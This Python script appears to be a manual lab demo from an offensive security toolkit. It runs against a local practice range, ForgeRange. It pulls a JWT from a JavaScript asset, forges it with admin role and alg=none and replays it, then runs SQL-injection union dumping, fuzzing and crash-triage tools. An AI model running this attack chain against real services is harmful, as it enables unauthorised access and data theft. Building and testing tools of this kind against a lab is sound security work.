"""Lab: live end-to-end strike demo — jwt_forge_replay + sqli triage vs ForgeRange.
Not a pytest case; run by hand: python lab/test_strike_demo.py
"""
import json, re, sys, os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import tools
from tools._exploit_lib import send

BASE = "http://127.0.0.1:8765"

# 0. range alive?
st, body, _dt = send(f"{BASE}/")
assert st == 200, f"range down ({st}) — start it: python lab/forge_range.py"
print(f"[0] ForgeRange alive ({st})")

# 1. mine the anon token from the tracker chunk (the js_mine -> jwt chain, live)
st, chunk, _dt = send(f"{BASE}/assets/chunk-Tracker-EF56GH78.js")
tok = re.search(r'"(eyJ[^"]+)"', chunk).group(1)
print(f"[1] mined anon token: {tok[:48]}...")

# 2. baseline: anon token against /orders -> expect 403 (RLS sim)
st, body, _dt = send(f"{BASE}/orders", headers={"Authorization": f"Bearer {tok}"})
print(f"[2] baseline /orders with anon token -> {st} ({'blocked' if st == 403 else 'UNEXPECTED'})")

# 3. STRIKE: forge role=admin / alg=none and replay
out = tools.execute("jwt_forge_replay", {"token": tok,
                                         "replay_url": f"{BASE}/orders"})
r = json.loads(out)
print(f"[3] jwt_forge_replay verdict: {r['summary']}")
for res in r.get("results", [])[:4]:
    tag = "ACCEPTED" if res["accepted"] else "rejected"
    print(f"    - {res['name']:24s} -> {res['status']} {tag}")
print(f"    evidence: {r['evidence'][:1]}")

# 4. sqli surface honesty check: /products?id= simulates the sqlite error only —
#    the dump tool must report PARTIAL, never a fake exfil
out2 = tools.execute("sqli_union_dump", {"url_template": f"{BASE}/products?id={{INJ}}"})
r2 = json.loads(out2)
print(f"[4] sqli_union_dump verdict: {r2['summary']}")
print(f"    exploitable flag: {r2['exploitable']!r} (must not be True without rows)")

# 5. fuzz the products endpoint briefly, triage what it finds
out3 = tools.execute("fuzz_attack_surface",
                     {"url": f"{BASE}/products?id=1", "max_requests": 40})
r3 = json.loads(out3)
print(f"[5] fuzz_attack_surface: {r3['summary']}")
out4 = tools.execute("crash_triage_next", {})
r4 = json.loads(out4)
print(f"[6] crash_triage_next: {r4['summary']}")

print("\n=== strike demo complete ===")
